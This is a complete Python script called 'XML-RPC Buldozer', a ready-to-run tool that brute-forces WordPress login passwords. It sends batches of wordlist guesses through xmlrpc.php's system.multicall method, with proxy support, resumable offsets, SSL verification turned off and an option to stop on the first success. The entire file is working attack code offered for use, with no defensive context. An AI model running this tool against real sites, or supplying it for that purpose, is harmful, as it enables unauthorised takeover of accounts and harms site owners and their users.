import requests
import argparse
from time import sleep
import urllib3
from xml.sax.saxutils import escape

# 🔇 Disable SSL warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === TOOL BANNER ===
print("\n==============================")
print("   💥 XML-RPC Buldozer 💥")
print("==============================\n")

# === ARGUMENT PARSING ===
parser = argparse.ArgumentParser(description="High-speed XML-RPC bruteforce tool for WordPress using system.multicall")
parser.add_argument("--user", required=True, help="Username to bruteforce")
parser.add_argument("--wordlist", required=True, help="Password list file")
parser.add_argument("--url", default="https://target.com/xmlrpc.php", help="URL to xmlrpc.php")
parser.add_argument("--batch", type=int, default=20, help="Number of attempts per request (default = 20)")
parser.add_argument("--delay", type=int, default=0, help="Delay between batches (in seconds)")
parser.add_argument("--proxy", help="Proxy address, e.g. http://127.0.0.1:8080")
parser.add_argument("--startfrom", type=int, default=0, help="Start from a specific line in the wordlist")
parser.add_argument("--stop-on-success", action="store_true", help="Stop execution on first valid password found")
args = parser.parse_args()

XMLRPC_URL = args.url
USERNAME = args.user
WORDLIST = args.wordlist
USER_AGENT = "Mozilla/5.0"

# === XML-RPC REQUEST TEMPLATE ===
def generate_call(password):
    safe_user = escape(USERNAME)
    safe_pw = escape(password)
    return f"""
    <value>
      <struct>
        <member><name>methodName</name><value><string>metaWeblog.getUsersBlogs</string></value></member>
        <member><name>params</name><value>
          <array><data>
            <value><array><data>
              <value><string>appkey</string></value>
              <value><string>{safe_user}</string></value>
              <value><string>{safe_pw}</string></value>
            </data></array></value>
          </data></array>
        </value></member>
      </struct>
    </value>
    """

def build_multicall(passwords):
    calls = "".join([generate_call(pw) for pw in passwords])
    return f"""<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            {calls}
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>"""

# === PASSWORD LOADER WITH OFFSET SUPPORT ===
def load_passwords(path):
    with open(path, "r", encoding="utf-8") as f:
        for i, line in enumerate(f):
            if i < args.startfrom:
                continue
            pw = line.strip()
            if pw:
                yield pw

# === RESPONSE PARSER ===
def parse_response(xml, passwords):
    chunks = xml.split("<struct>")[1:]
    for idx, pw in enumerate(passwords):
        if idx < len(chunks) and "faultCode" not in chunks[idx]:
            print(f"[✅] SUCCESS → {USERNAME}:{pw}")
            return True
        else:
            print(f"[❌] FAILED → {USERNAME}:{pw}")
    return False

# === MULTICALL BATCH SENDER ===
def process_batch(batch, headers, proxies):
    xml_payload = build_multicall(batch)
    try:
        response = requests.post(XMLRPC_URL, data=xml_payload.encode(), headers=headers, proxies=proxies, verify=False, timeout=20)
        if response.status_code == 200:
            success = parse_response(response.text, batch)
            if success and args.stop_on_success:
                print("\n[💥] Valid password found, exiting.")
                exit(0)
        else:
            print(f"[❌] HTTP Error: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[❌] Network error: {e}")

# === MAIN LOGIC ===
def bruteforce():
    passwords = load_passwords(WORDLIST)
    headers = {
        "Content-Type": "text/xml",
        "User-Agent": USER_AGENT
    }

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    batch = []
    count = args.startfrom

    for pw in passwords:
        batch.append(pw)
        count += 1

        if len(batch) == args.batch:
            print(f"\n[🚀] Attempting passwords {count - args.batch + 1} → {count}")
            process_batch(batch, headers, proxies)
            if args.delay:
                print(f"[⏳] Sleeping for {args.delay}s...")
                sleep(args.delay)
            batch = []

    if batch:
        print(f"\n[🚀] Final batch {count - len(batch) + 1} → {count}")
        process_batch(batch, headers, proxies)

if __name__ == "__main__":
    bruteforce()

